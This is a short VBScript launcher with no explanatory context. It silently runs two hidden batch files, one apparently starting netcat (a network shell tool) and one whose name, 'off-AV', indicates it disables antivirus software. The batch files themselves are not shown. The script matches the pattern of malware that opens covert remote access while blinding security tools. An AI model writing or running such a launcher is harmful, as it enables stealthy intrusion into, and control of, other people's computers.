Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c start /min netcat.bat", 0, True
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c start /min off-AV.bat", 0, True










